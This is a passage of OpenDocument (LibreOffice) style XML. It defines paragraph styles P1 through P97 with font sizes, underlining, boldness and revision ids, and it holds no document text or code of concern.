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officeooo:rsid="000d4d65" officeooo:paragraph-rsid="000d4d65" style:font-size-asian="16pt" style:font-size-complex="16pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" officeooo:rsid="000da561" officeooo:paragraph-rsid="000da561" style:font-size-asian="9.60000038146973pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" officeooo:rsid="000da561" officeooo:paragraph-rsid="000da561" style:font-size-asian="9.60000038146973pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" officeooo:rsid="002e7ebe" officeooo:paragraph-rsid="002e7ebe" style:font-size-asian="9.60000038146973pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" officeooo:rsid="0072d6f4" officeooo:paragraph-rsid="0073d0a7" style:font-size-asian="9.60000038146973pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" officeooo:rsid="007e899f" officeooo:paragraph-rsid="007e899f" style:font-size-asian="9.60000038146973pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" officeooo:rsid="007fbde1" officeooo:paragraph-rsid="007fbde1" style:font-size-asian="9.60000038146973pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P8"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1b9165" officeooo:paragraph-rsid="001b9165" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P9"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1ffe78" officeooo:paragraph-rsid="001ffe78" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>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27f2fb" officeooo:paragraph-rsid="0028f27a" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P11"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29e734" officeooo:paragraph-rsid="0029e734"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2a2410" officeooo:paragraph-rsid="002d1556" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P13"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2e7ebe" officeooo:paragraph-rsid="002e7ebe" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P14"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3d2e8b" officeooo:paragraph-rsid="003d2e8b" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>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40399b" officeooo:paragraph-rsid="0040399b" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P16"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417004" officeooo:paragraph-rsid="00417004" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P17"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490c2f" officeooo:paragraph-rsid="00490c2f" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P18"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4945f7" officeooo:paragraph-rsid="004945f7" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P19"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4e4637" officeooo:paragraph-rsid="004e4637" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P20"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539622" officeooo:paragraph-rsid="00555f12" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P21"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5c2b4e" officeooo:paragraph-rsid="005f3330" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="006fddbe" officeooo:paragraph-rsid="006fddbe" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="0078ee28" officeooo:paragraph-rsid="0078ee28" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="007b6353" officeooo:paragraph-rsid="007b6353" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="007c6a87" officeooo:paragraph-rsid="007c6a87" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="00949fdf" officeooo:paragraph-rsid="00949fdf" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="009abe97" officeooo:paragraph-rsid="009abe97" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="009c09b0" officeooo:paragraph-rsid="009c09b0" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="00a83132" officeooo:paragraph-rsid="00a83132" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="00abf02a" officeooo:paragraph-rsid="00abf02a" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="009cdcc8" officeooo:paragraph-rsid="009cdcc8" style:font-size-asian="11pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P32"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5ac846" officeooo:paragraph-rsid="005ac846"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60b179" officeooo:paragraph-rsid="006171fa"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660ccb" officeooo:paragraph-rsid="00660ccb" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="00752790" officeooo:paragraph-rsid="0078ee28" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="009f9b61" officeooo:paragraph-rsid="009f9b61" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="00a2b77a" officeooo:paragraph-rsid="00a2b77a"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fo:font-size="11pt" style:text-underline-style="none" officeooo:rsid="000da561" officeooo:paragraph-rsid="000da561" style:font-size-asian="9.60000038146973pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" officeooo:rsid="001226ec" officeooo:paragraph-rsid="001226ec" style:font-size-asian="9.60000038146973pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" officeooo:rsid="001a10c9" officeooo:paragraph-rsid="001a10c9" style:font-size-asian="9.60000038146973pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="000da561" officeooo:paragraph-rsid="000da561" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00140e74" officeooo:paragraph-rsid="00140e74" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="001562bf" officeooo:paragraph-rsid="001562bf" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00164ea3" officeooo:paragraph-rsid="0019bc5b" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0019bc5b" officeooo:paragraph-rsid="0019bc5b" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="001b06d5" officeooo:paragraph-rsid="001b6743" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="001b06d5" officeooo:paragraph-rsid="001b06d5" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="001a10c9" officeooo:paragraph-rsid="001a10c9" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="004d85b3" officeooo:paragraph-rsid="004945f7" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="004d85b3" officeooo:paragraph-rsid="006171fa" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="005099d6" officeooo:paragraph-rsid="00539622" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00555f12" officeooo:paragraph-rsid="005f3330" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0073d0a7" officeooo:paragraph-rsid="0073d0a7" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00799547" officeooo:paragraph-rsid="00799547" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="007b6353" officeooo:paragraph-rsid="007b6353" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0082a7d6" officeooo:paragraph-rsid="007fbde1" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00a50390" officeooo:paragraph-rsid="00a50390" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="000da561" officeooo:paragraph-rsid="000da561" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="000da561" officeooo:paragraph-rsid="000da561"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fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="001562bf" officeooo:paragraph-rsid="001562bf"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fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00140e74" officeooo:paragraph-rsid="00140e74"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fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0022af59" officeooo:paragraph-rsid="001ffe78"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fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00296c4c" officeooo:paragraph-rsid="0028f27a"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fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0029e734" officeooo:paragraph-rsid="0029e734"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fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="002a2410" officeooo:paragraph-rsid="002d1556"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fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00315ec1" officeooo:paragraph-rsid="002e7ebe"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fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0068d64b" officeooo:paragraph-rsid="00660ccb"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077a998" officeooo:paragraph-rsid="0078ee28"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07c6a87" officeooo:paragraph-rsid="007c6a87"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0932303" officeooo:paragraph-rsid="00932303"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0de1dae" officeooo:paragraph-rsid="00de1dae" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="15pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="000da561" officeooo:paragraph-rsid="000da561" style:font-size-asian="15pt" style:font-weight-asian="bold" style:font-size-complex="15pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="15pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="00a50390" officeooo:paragraph-rsid="00a50390" style:font-size-asian="15pt" style:font-weight-asian="bold" style:font-size-complex="15pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="15pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="00daa822" officeooo:paragraph-rsid="00daa822" style:font-size-asian="15pt" style:font-weight-asian="normal" style:font-size-complex="15pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P75" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00641a49" officeooo:paragraph-rsid="00641a49" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P76" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="13pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="000da561" officeooo:paragraph-rsid="007d9023" style:font-size-asian="13pt" style:font-weight-asian="normal" style:font-size-complex="13pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P77" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="none" officeooo:rsid="000d4d65" officeooo:paragraph-rsid="000d4d65" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P78" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="000d4d65" officeooo:paragraph-rsid="000d4d65" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P79" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00b7a8e3" officeooo:paragraph-rsid="00b7a8e3" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P80" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00baf4ce" officeooo:paragraph-rsid="00baf4ce" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P81" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00c5aef9" officeooo:paragraph-rsid="00c5aef9" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P82" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00c70047" officeooo:paragraph-rsid="00c70047" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P83" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="00ce6b73" officeooo:paragraph-rsid="00ce6b73" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P84" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="00ce6b73" officeooo:paragraph-rsid="00ce6b73" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P85" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="Numbering_20_123">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" officeooo:rsid="000da561" officeooo:paragraph-rsid="000da561" style:font-size-asian="9.60000038146973pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P86" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="List_20_1">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="003ac69f" officeooo:paragraph-rsid="003ac69f" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P87" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="00ebe37f" officeooo:paragraph-rsid="00ebe37f" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P88" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="00e43a0a" officeooo:paragraph-rsid="00e43a0a" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P89" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0098ca71" officeooo:paragraph-rsid="00949fdf" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P90" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00af0478" officeooo:paragraph-rsid="00b3e9da" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P91" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00de1dae" officeooo:paragraph-rsid="00de1dae" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P92" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="009abe97" officeooo:paragraph-rsid="009abe97" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P93" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00ab674d" officeooo:paragraph-rsid="00a83132" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P94" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00e17035" officeooo:paragraph-rsid="00e17035" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P95" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00e43a0a" officeooo:paragraph-rsid="00e43a0a" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P96" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00ef3ac6" officeooo:paragraph-rsid="00ef3ac6" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P97" style:family="paragraph" style:parent-style-name="Standard">
